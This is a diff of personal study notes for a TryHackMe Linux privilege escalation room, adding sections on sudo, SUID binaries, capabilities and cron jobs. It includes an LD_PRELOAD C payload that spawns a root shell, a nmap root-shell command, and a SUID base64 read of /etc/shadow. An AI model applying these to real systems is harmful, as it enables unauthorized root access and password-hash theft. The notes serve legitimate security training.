@@ -5,7 +5,9 @@ https://tryhackme.com/room/linprivesc
 - [[#Enumeration]] --> [[#`ps` -- Processes|`ps`]], [[#`find`|`find`]]
 - [[#Automated Enumeration]]
 - [[#Kernel Exploits]]
-- 
+- [[#`sudo`]]
+- [[#SUID]]
+- [[#Capabilities]]
 
 
 ___
@@ -52,7 +54,7 @@ Additional information about target **system process** --> **kernel** version, w
 --> **PATH** variable may have **compiler** / **scripting** language (e.g. Python) that could be used to run code on target system / leveraged for privilege escalation
 
 **`sudo -l`**
-List commands user can run using `sudo`
+List commands current user can run using `sudo`
 
 **`ls -la`**: ...
 
@@ -146,26 +148,94 @@ ___
 7. Run: `./exploit`
 
 ___
-### Sudo
+### `sudo`
 [[#Table of contents|Back to the top]]
 
+*Run program with root privilege* 
 
+User might have been given authorization to run ***some*** programs with root privileges but not all
+--> **`sudo -l`** to discover which
+
+Attacker may not have sudo rights for `cat` but for `less` or `nano` for instance
+
+**`sudo nmap --interactive`**: spawns shell with root privilege
+
+[https://gtfobins.github.io/](https://gtfobins.github.io/): information on how any program, on which you may have sudo rights, can be used
+
+
+**Application functions**
+Some application functions can be hijacked to gain access to otherwise inaccessible resources
+*Example:* apache2 has a -f function that supports loading alternative config file, we can choose any file that we want to read the 1st line of
+
+
+**LD_PRELOAD**
+Allows programs to use shared libraries
+If `env_keep` is enabled --> generate shared library, loaded and executed before program is run
+
+1. Check for `LD_PRELOAD` (with `env_keep` option): **`env_keep+=LD_PRELOAD`**
+2. Write C code compiled as shell.so (share object)
+`shell.c`
+```C
+#include <stdio.h>  
+#include <sys/types.h>  
+#include <stdlib.h>  
+  
+void _init() {  
+unsetenv("LD_PRELOAD");  
+setgid(0);  
+setuid(0);  
+system("/bin/bash");  
+}
+```
+`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+
+3. Run any program with sudo rights (e.g. apache2, find, ...) and LD_PRELOAD option pointing to shell.so
+`sudo LD_PRELOAD=/home/user/ldpreload/shell.so <program_with_sudo_rights>`
+
+$\Rightarrow$ Shell with root privilege has spawned!
 
 ___
-### 
+### SUID
 [[#Table of contents|Back to the top]]
 
+Classic permissions: file can or can't be read, written, executed by owner, owner group, others
 
+**SUID:** Set-user Identification
+**SGID:** Set-group Identification
+--> file can be executed with (group) owner permission level
+
+Indicated by `s` for **s**pecial permission
+
+**`find / -type f -perm -04000 -ls 2>/dev/null`**: list files with SUID/SGID set
+
+**Compare executables with [GTFO Bins list](https://gtfobins.github.io/#+suid)**
+
+##### Practical
+1. `find / -type f -perm -04000 -ls 2>/dev/null`: find binaries with SUID set
+2. Compare with [GTFO Bins list](https://gtfobins.github.io/#+suid)
+	   --> base64 allows to read unreadable files
+3. `LFILE=/etc/shadow`
+   `/usr/bin/base64 "$LFILE" | base64 --decode`
+4. Dictionary attack on hash
 
 ___
-### 
+### Capabilities
 [[#Table of contents|Back to the top]]
 
+*Provide additional capabilities to binary without elevating user's privilege*
+--> can be hijacked in order to gain additional capabilities without privilege escalating
 
+**`getcap`:** list enabled capabilities
+
+**`getcap -r / 2>/dev/null`:** recursive search with redirection of error messages
+
+**Compare with GTFO Bins list**
 
 ___
-### 
+### Cron Jobs
 [[#Table of contents|Back to the top]]
+
+*Run scripts/binaries at specific times*
 
 
 
